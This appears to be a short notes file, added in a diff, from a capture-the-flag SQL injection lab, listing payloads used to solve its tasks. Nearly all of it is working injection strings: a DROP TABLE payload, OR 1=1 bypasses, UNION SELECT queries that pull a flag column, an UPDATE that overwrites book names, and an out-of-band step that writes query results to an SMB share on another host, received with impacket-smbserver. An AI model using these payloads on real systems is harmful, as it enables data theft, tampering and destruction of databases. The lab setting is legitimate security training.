@@ -1,0 +1,34 @@
+Payloads
+
+Intro to PHP'; DROP TABLE books;--
+*dropping a table = '; DROP TABLE books; -- 
+'1' OR 1=1 --
+Intro to PHP' || 1=1 --+
+OR = ||
+
+
+
+1'; SELECT flag INTO OUTFILE '\\\\192.168.233.112\\logs\\out.txt'; --
+
+sudo impacket-smbserver -smb2support logs /tmp/smb_receiver
+
+update book set = 12345'; UPDATE books SET book_name = 'Hacked'; --
+
+
+
+DIR
+/space/search_users.php?username=?
+/second/update.php
+/encoding/
+/oob/search_visitor.php?visitor_name=Tim
+/httpagent/  ' UNION SELECT book_id, flag FROM books; #
+http://10.66.139.156/encoding/search_books.php?book_name=intro'1'%20OR%201=1%20--
+
+
+
+What is the value of the flag field in the books table where book_id =1? 
+
+' UNION SELECT book_id, flag FROM books; # 
+
+http://10.64.150.184/user?id=2%20union%20all%20select%20%2744%20UNION%20SELECT%205,flag,7,8%20from%20flag--%20-%20%27,%27is%27,%27great%27%20FROM%20users--%20-
+
